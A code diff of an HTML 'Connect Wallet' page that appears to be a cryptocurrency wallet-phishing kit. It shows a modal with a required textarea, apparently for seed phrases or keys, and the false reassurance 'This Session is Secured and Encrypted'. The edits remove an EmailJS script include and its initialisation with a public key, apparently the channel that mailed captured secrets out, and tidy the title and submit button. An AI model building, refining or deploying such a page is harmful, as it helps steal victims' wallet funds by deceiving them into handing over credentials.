@@ -13,18 +13,6 @@
     <link rel="stylesheet" href="./css/stylesWallet.css" />
 
     <title>Connect</title>
-
-    <script
-      type="text/javascript"
-      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
-    ></script>
-    <script type="text/javascript">
-      (function () {
-        emailjs.init({
-          publicKey: "CwZJ5v2UX4cUCPvuy",
-        });
-      })();
-    </script>
   </head>
   <body>
     <noscript>You need to enable JavaScript to run this app.</noscript>
@@ -1652,7 +1640,7 @@
             src="https://decentralizedauthweb.vercel.app/connect"
             alt=""
           />
-          <h2 id="modalTitle"></h2>
+          <h2 id="modalTitle" name="title"></h2>
           <br />
           <p style="color: #808080">This Session is Secured and Encrypted</p>
 
@@ -1692,9 +1680,7 @@
               required
             ></textarea>
 
-            <button id="sendButton" type="submit" name="submit" value="submit">
-              Connect Wallet
-            </button>
+            <button id="sendButton">Connect Wallet</button>
           </div>
 
           <div id="successContainer" class="container">
